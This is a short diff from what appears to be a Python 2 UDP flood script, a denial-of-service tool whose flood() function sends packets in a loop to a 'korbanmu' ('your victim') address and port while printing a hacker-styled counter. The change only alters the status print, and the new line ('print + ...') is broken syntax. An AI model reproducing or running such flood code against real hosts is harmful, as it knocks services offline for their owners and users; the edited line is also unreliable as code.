@@ -88,7 +88,7 @@ def flood(korbanmu, vport, durasi):
 
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
-        print bcolors.IJO + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
+        print + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
 	
 def main():
     print len(sys.argv)
